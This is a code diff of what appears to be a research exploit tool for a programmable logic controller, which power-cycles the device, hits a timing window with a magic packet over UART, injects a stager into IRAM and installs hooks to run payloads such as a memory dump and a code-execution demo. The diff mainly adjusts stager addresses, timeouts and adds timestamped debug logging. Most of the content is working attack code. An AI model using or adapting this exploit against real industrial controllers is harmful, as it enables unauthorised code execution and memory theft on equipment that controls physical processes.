@@ -40,7 +40,7 @@ FIRST_PAYLOAD_LOCATION = 0x10010100
 next_payload_location = FIRST_PAYLOAD_LOCATION
 
 # Maximum number of bytes to be sent in one request (Sending chunks larger than 16 bytes seems to overflow the read buffer)
-#MAX_MSG_LEN = 64-2
+# MAX_MSG_LEN = 64-2
 MAX_MSG_LEN = 192-2
 
 # Addresses used to inject shellcode (different values are possible here)
@@ -50,10 +50,10 @@ DEFAULT_STAGER_ADDHOOK_IND = 0x20
 # For installing an additional hook, we also assign a default index
 DEFAULT_SECOND_ADD_HOOK_IND = 0x1a
 
-IRAM_STAGER_START = 0x1003AD00
-IRAM_STAGER_END = 0x10040000
-#IRAM_STAGER_START = 0x10030100
-#RAM_STAGER_END = 0x100303FC
+#IRAM_STAGER_START = 0x1003AD00
+#IRAM_STAGER_END = 0x10040000
+IRAM_STAGER_START = 0x10030100
+IRAM_STAGER_END = 0x100303FC
 #IRAM_STAGER_START = 0x10010000
 #IRAM_STAGER_END = 0x10020000
 IRAM_STAGER_MAX_SIZE = IRAM_STAGER_END - IRAM_STAGER_START
@@ -88,7 +88,9 @@ def calc_checksum_byte(incoming):
     return struct.pack("<i", -sum(map(ord, incoming[:ord(incoming[0])])))[0]
 
 
-def send_packet(r, msg, step=2, sleep_amt=0.02):
+def send_packet(r, msg, step=2, sleep_amt=0.01):
+    ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+    log.info("[%s] sending packet: %s" % (ts, msg.encode("hex")))
     """
     The base function to send a single packet. We need to chunk the packet
     up during transmission as to not overflowing the PLC's UART buffer.
@@ -114,6 +116,7 @@ def send_packet(r, msg, step=2, sleep_amt=0.02):
 
 
 def recv_packet(r):
+    ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
     """
     Receive a single packet, verifying and discarding
     checksum and length metadata.
@@ -127,16 +130,15 @@ def recv_packet(r):
         add = r.recv(rem)
         rem -= len(add)
         answ += add
-
     if calc_checksum_byte(answ[:-1]) != answ[-1]:
-        print("Checksum validity failed. Got: {} [{}".format(
-            answ, answ.encode("hex")))
+        print("[{}] Checksum validity failed. Got: {} [{}]".format(ts, answ, answ.encode("hex")))
         return None
     else:
+        log.info("[%s] received packet: %s" % (ts, answ.encode("hex")))
         return answ[1:-1]
 
 
-def recv_many(r, verbose=True):
+def recv_many(r, verbose=False):
     """
     Receive all packets until an empty packet is received.
     
@@ -149,7 +151,7 @@ def recv_many(r, verbose=True):
 
     while not stop:
         next_chunk = recv_packet(r)
-        if verbose: #and (len(answ) & 0xff) < 16:
+        if verbose and (len(answ) & 0xff) < 16:
             print("Read {}".format(len(answ)))
         if next_chunk == "":
             stop = True
@@ -359,14 +361,12 @@ def bye(r):
     send_packet(r, chr(hook_ind))
     answ = recv_packet(r)
     # For good measure check that we got the correct response and we are indeed in sync
-    print(answ)
-    #assert(answ == "\xa2\x00")
-    assert(answ == "\x1c\x00")
+    assert(answ == "\xa2\x00")
 
 
 
 
-def invoke_add_hook(r, add_hook_no, args="", await_response=False):
+def invoke_add_hook(r, add_hook_no, args="", await_response=True):
     # Check range for additional hook
     assert(0 <= add_hook_no <= 0x20)
     # Also check that the size of arguments that we input matches the expected value
@@ -440,18 +440,22 @@ def payload_dump_mem(r, tar_addr, num_bytes, addhook_ind):
     """
     This function uses payloads/dump_mem to dump memory contents.
     """
-    answ = invoke_add_hook(r, addhook_ind, "A"+struct.pack(">II", tar_addr, num_bytes))
-    log.info("[payload_dump_mem] answ (len: {}): {}".format(len(answ), answ))
+    print("[DEBUG] Invoking add_hook for dump_mem: addhook_ind={}, tar_addr=0x{:08x}, num_bytes={}".format(addhook_ind, tar_addr, num_bytes))
+    answ = invoke_add_hook(
+        r, addhook_ind, "A"+struct.pack(">II", tar_addr, num_bytes))
+    print("[DEBUG] Response from invoke_add_hook: {}".format(repr(answ)))
+    log.debug("[payload_dump_mem] answ (len: {}): {}".format(len(answ), answ))
     assert(answ.startswith("Ok"))
-    contents = recv_many(r, verbose=False)
+    print("[DEBUG] Receiving memory dump packets...")
+    contents = recv_many(r, verbose=True)
+    print("[DEBUG] Finished receiving memory dump, total bytes: {}".format(len(contents)))
     return contents
 
 
 
 def handle_conn(r, action, args):
     global next_payload_location
-
-    print("[+] Got connection")
+    print("[{}] [+] Got connection".format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
     answ = recv_packet(r)
     print('\x1b[6;30;42m'+ "[+] Got special access greeting: {} [{}]".format(answ, hexlify(answ))+ '\x1b[0m')
 
@@ -484,12 +488,12 @@ def handle_conn(r, action, args):
     if payload is not None:
         start = time.time()
         second_addhook_ind = install_addhook_via_stager(r, next_payload_location, payload, stager_addhook_ind)
-        print("Installing the additional hook took {} seconds".format(time.time()-start))
+        print("[{}] Installing the additional hook took {} seconds".format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), time.time()-start))
 
     
     if action == ACTION_INVOKE_HOOK:
         answ = invoke_add_hook(r, second_addhook_ind, args.args)
-        print("Got answer: {}".format(answ))
+        print("[{}] Got answer: {}".format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), answ))
 
     elif action == ACTION_DUMP:
         if args.outfile is None:
@@ -505,21 +509,23 @@ def handle_conn(r, action, args):
     
 
     elif action == ACTION_TEST:
-        answ = invoke_add_hook(r, second_addhook_ind, await_response=True)
+        answ = invoke_add_hook(r, second_addhook_ind)
         print("Got answer: {}".format(answ))
 
 
     elif action == ACTION_HELLO_LOOP:
-        answ = invoke_add_hook(r, second_addhook_ind, await_response=True)
+        answ = invoke_add_hook(r, second_addhook_ind, await_response=False)
         while True:
-            print("Got packet: {}".format(recv_packet(r)))
+            pkt = recv_packet(r)
+            print("[{}] Got packet: {}".format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), pkt))
 
     elif action == ACTION_TIC_TAC_TOE:
-        print("[*] Demonstrating Code Execution")
-        invoke_add_hook(r, second_addhook_ind, await_response=True)
-        print("invoked")
+        print("[{}] [*] Demonstrating Code Execution".format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
+        print(second_addhook_ind)
+        invoke_add_hook(r, second_addhook_ind)
         msg = ""
         END_TOKEN = "==>"
+        print(END_TOKEN)
         while END_TOKEN not in msg:
             msg = recv_packet(r)
             sys.stdout.write(msg)
@@ -529,7 +535,7 @@ def handle_conn(r, action, args):
                 choice = raw_input()
                 send_packet(r, choice[0])
 
-        print("[*] Done here!")
+        print("[{}] [*] Done here!".format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
 
 
     # END test code
@@ -582,7 +588,7 @@ def main():
     ps_modbus_group.add_argument('--ps-modbus-coil', dest='ps_modbus_coil', default=0, type=int,
                         help='Modbus coil address (0-indexed) to control (default: 0).')
 
-    parser.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('rb'), default=STAGER_PL_FILENAME,
+    parser.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('r'), default=STAGER_PL_FILENAME,
                         help='the location of the stager payload')
     parser.add_argument('-c', '--continue', dest='cont', default=False, action='store_true', help="Continue PLC execution after action completed")
     parser.add_argument('-e', '--extra', default="", dest='extra', nargs='+', help="Additional arguments for custom logic")
@@ -602,16 +608,16 @@ def main():
 
 
     parser_test = subparsers.add_parser(ACTION_TEST)
-    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default="payloads/hello_world/hello_world.bin",
+    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('r'), default="payloads/hello_world/hello_world.bin",
                         help='The file containing the payload to be executed, defaults to payloads/hello_world/hello_world.bin')
 
     parser_test = subparsers.add_parser(ACTION_HELLO_LOOP)
-    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default="payloads/hello_loop/build/hello_loop.bin",
+    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('r'), default="payloads/hello_loop/build/hello_loop.bin",
                         help='The file containing the payload to be executed, defaults to payloads/hello_loop/build/hello_loop.bin')
     
 
     parser_test = subparsers.add_parser(ACTION_TIC_TAC_TOE)
-    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default="payloads/tic_tac_toe/build/tic_tac_toe.bin",
+    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('r'), default="payloads/tic_tac_toe/build/tic_tac_toe.bin",
                         help='The file containing the payload to be executed, defaults to payloads/tic_tac_toe/build/tic_tac_toe.bin')
 
  
@@ -655,7 +661,7 @@ def main():
         call_switch_power("off")
 
         log.info("[+] Turned off power supply, sleeping for {}s...".format(args.powersupply_delay))
-        time.sleep(args.powersupply_delay)
+        time.sleep(args.powersupply_delay/1000)
 
         log.info("[+] Turning on power supply (type: {}) again...".format(args.ps_type))
         call_switch_power("on")
@@ -667,7 +673,7 @@ def main():
         # We have 500000 microseconds (half a second) to hit the timing
         s.send(pad + magic)
 
-        answ = s.recv(256, timeout=0.2)
+        answ = s.recv(256, timeout=0.3)
         if len(answ) > 0:
             if not answ.startswith("\5-CPU"):
                 answ += s.recv(256)
